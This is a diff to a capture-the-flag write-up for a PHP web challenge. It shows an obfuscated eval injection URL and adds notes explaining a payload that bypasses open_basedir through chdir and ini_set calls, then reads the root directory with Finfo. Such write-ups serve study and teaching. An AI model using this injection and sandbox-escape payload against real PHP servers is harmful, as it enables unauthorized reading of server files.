@@ -86,8 +86,9 @@ http://web2.q21.ctfsecurinets.com:8081/?%20cmd=eval((((((1/0).(1)){0})%26(((1/0)
 
 
 * we found that ``ini_set()``  is not disabled
-* there is a ``/images`` dir in 
-* 
+* there is a ``/images`` dir 
+* the flag location is ``/``
+* so we can bypass open_basedir and use finfo to read contents
 
 payload:**ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);chdir('images');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir', '/');new Finfo(0,"/");**
 
